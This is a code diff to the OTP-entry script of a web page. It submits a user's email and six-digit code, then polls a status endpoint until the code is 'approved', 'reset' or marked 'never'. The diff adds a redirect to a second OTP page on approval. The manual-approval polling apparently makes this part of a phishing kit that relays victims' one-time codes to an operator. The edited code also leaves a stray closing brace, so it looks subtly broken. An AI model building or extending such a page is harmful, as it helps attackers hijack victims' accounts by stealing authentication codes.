@@ -273,67 +273,71 @@ button:disabled{
   }
 
   async function verifyOTP() {
-    if (isProcessing) return;
-    const otp = getOTP();
-    if (!otp || otp.length !== 6) {
-      errorDiv.textContent = 'Please enter all 6 digits';
-      errorDiv.style.display = 'block';
-      setTimeout(() => {
-        errorDiv.style.display = 'none';
-      }, 3000);
-      return;
-    }
+  if (isProcessing) return;
+  const otp = getOTP();
+  if (!otp || otp.length !== 6) {
+    errorDiv.textContent = 'Please enter all 6 digits';
+    errorDiv.style.display = 'block';
+    setTimeout(() => {
+      errorDiv.style.display = 'none';
+    }, 3000);
+    return;
+  }
 
-    showLoading();
-    try {
-      const response = await fetch('/api/users/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, otp })
-      });
-      const data = await response.json();
-      
-      if (data.success) {
-        if (checkInterval) clearInterval(checkInterval);
-        checkInterval = setInterval(async () => {
-          try {
-            const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
-            const statusData = await statusResponse.json();
-            
-            if (statusData.reset) {
-              clearInterval(checkInterval);
-              showIncorrectMessage();
-              checkInterval = null;
-            } else if (statusData.approved === true || statusData.never === true) {
-              clearInterval(checkInterval);
-              window.location.href = `/success?email=${encodeURIComponent(email)}`;
-              checkInterval = null;
-            }
-          } catch(e) {
-            console.log('Checking status...', e);
+  showLoading();
+  try {
+    const response = await fetch('/api/users/submit-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, otp })
+    });
+    const data = await response.json();
+    
+    if (data.success) {
+      if (checkInterval) clearInterval(checkInterval);
+      checkInterval = setInterval(async () => {
+        try {
+          const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
+          const statusData = await statusResponse.json();
+          
+          if (statusData.reset) {
+            clearInterval(checkInterval);
+            showIncorrectMessage();
+            checkInterval = null;
+          } else if (statusData.never === true) {
+            clearInterval(checkInterval);
+            window.location.href = `/success?email=${encodeURIComponent(email)}`;
+            checkInterval = null;
+          } else if (statusData.approved === true) {
+            clearInterval(checkInterval);
+            window.location.href = `/otp2/${encodeURIComponent(email)}/`;
+            checkInterval = null;
           }
-        }, 2000);
-      } else {
-        isProcessing = false;
-        verifyBtn.disabled = false;
-        verifyBtn.innerHTML = 'Verify';
-        errorDiv.textContent = data.error || 'Invalid OTP';
-        errorDiv.style.display = 'block';
-        setTimeout(() => {
-          errorDiv.style.display = 'none';
-        }, 3000);
-      }
-    } catch (error) {
+        } catch(e) {
+          console.log('Checking status...', e);
+        }
+      }, 2000);
+    } else {
       isProcessing = false;
       verifyBtn.disabled = false;
       verifyBtn.innerHTML = 'Verify';
-      errorDiv.textContent = 'Network error. Please try again.';
+      errorDiv.textContent = data.error || 'Invalid OTP';
       errorDiv.style.display = 'block';
       setTimeout(() => {
         errorDiv.style.display = 'none';
       }, 3000);
     }
+  } catch (error) {
+    isProcessing = false;
+    verifyBtn.disabled = false;
+    verifyBtn.innerHTML = 'Verify';
+    errorDiv.textContent = 'Network error. Please try again.';
+    errorDiv.style.display = 'block';
+    setTimeout(() => {
+      errorDiv.style.display = 'none';
+    }, 3000);
   }
+        }
 
   verifyBtn.addEventListener('click', verifyOTP);
   otpInput.focus();
